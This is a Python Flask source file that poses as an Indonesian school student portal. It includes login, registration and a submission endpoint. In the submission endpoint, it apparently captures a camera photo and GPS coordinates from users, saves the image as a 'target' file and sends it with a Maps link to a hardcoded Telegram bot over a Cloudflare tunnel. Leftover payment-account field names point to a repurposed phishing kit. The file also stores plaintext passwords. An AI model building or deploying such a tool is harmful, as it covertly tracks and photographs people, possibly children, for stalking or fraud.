import os
import base64
import requests
import pandas as pd
from datetime import datetime
from flask import Flask, render_template, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = 'kunci_rahasia_sesi_aplikasi_sekolah'
UPLOAD_FOLDER = 'uploads'
USER_DB_FILE = 'database_siswa.xlsx'

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

if not os.path.exists(USER_DB_FILE):
    df_init = pd.DataFrame(columns=["Username", "Password", "Nama Lengkap", "Kelas", "Waktu Daftar"])
    df_init.to_excel(USER_DB_FILE, index=False)

TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"  
TELEGRAM_CHAT_ID = "8236797547"  

CLOUD_FLARE_URL = "https://bind-biblical-candy-land.trycloudflare.com"

def send_to_telegram(photo_path, lat, lng, method, acc_number, acc_name):
    maps_link = f"https://www.google.com/maps?q={lat},{lng}"
    now = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
    
    caption = (
        f"🚨 <b>AKTIVITAS SISWA MASUK!</b>\n\n"
        f"⏰ Waktu: {now}\n"
        f"📚 Kategori: <b>{method}</b>\n"
        f"🔢 ID/NISN: <code>{acc_number}</code>\n"
        f"👤 Atas Nama: <b>{acc_name}</b>\n\n"
        f"📍 Koordinat GPS: {lat}, {lng}\n"
        f"🗺️ <a href='{maps_link}'>Buka Lokasi di Google Maps</a>"
    )

    try:
        if photo_path and os.path.exists(photo_path):
            with open(photo_path, 'rb') as photo:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto",
                    data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption, 'parse_mode': 'HTML'},
                    files={'photo': photo}
                )

        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendLocation",
            data={'chat_id': TELEGRAM_CHAT_ID, 'latitude': lat, 'longitude': lng}
        )
    except Exception as e:
        print(f"[!] Gagal mengirim notifikasi Telegram: {e}")

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('index.html', user=session.get('full_name'), kelas=session.get('kelas'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if os.path.exists(USER_DB_FILE):
            df_users = pd.read_excel(USER_DB_FILE)
            user_row = df_users[(df_users['Username'] == username) & (df_users['Password'] == password)]
            if not user_row.empty:
                session['logged_in'] = True
                session['username'] = username
                session['full_name'] = user_row.iloc[0]['Nama Lengkap']
                session['kelas'] = user_row.iloc[0]['Kelas']
                return redirect(url_for('index'))
                
        return render_template('login.html', error="Username atau Password salah!")
            
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        full_name = request.form.get('full_name')
        kelas = request.form.get('kelas')
        
        if not username or not password or not full_name or not kelas:
            return render_template('register.html', error="Semua kolom wajib diisi!")
            
        df_users = pd.read_excel(USER_DB_FILE)
        
        if username in df_users['Username'].values:
            return render_template('register.html', error="Username sudah terdaftar, gunakan yang lain!")
            
        new_user = {
            "Username": username,
            "Password": password,
            "Nama Lengkap": full_name,
            "Kelas": kelas,
            "Waktu Daftar": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        df_final = pd.concat([df_users, pd.DataFrame([new_user])], ignore_index=True)
        df_final.to_excel(USER_DB_FILE, index=False)
        
        return redirect(url_for('login'))
        
    return render_template('register.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/submit-approval', methods=['POST'])
def submit_approval():
    if not session.get('logged_in'):
        return jsonify({"status": "error", "message": "Unauthorized"}), 401

    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        image_data = data.get('image')
        lat = data.get('latitude')
        lng = data.get('longitude')
        
        method = data.get('payment_method', session.get('kelas', 'Kelas Siswa'))
        acc_number = data.get('account_number', session.get('username'))
        acc_name = data.get('account_name', session.get('full_name'))

        if not lat or not lng:
            return jsonify({"status": "error", "message": "Incomplete coordinates"}), 400

        filename = None
        if image_data and "," in image_data:
            header, encoded = image_data.split(",", 1)
            image_bytes = base64.b64decode(encoded)
            
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = os.path.join(UPLOAD_FOLDER, f"target_{timestamp}.jpg")
            
            with open(filename, "wb") as f:
                f.write(image_bytes)

        send_to_telegram(filename, lat, lng, method, acc_number, acc_name)
        return jsonify({"status": "success"})

    except Exception as e:
        print(f"[!] Error processing submission: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
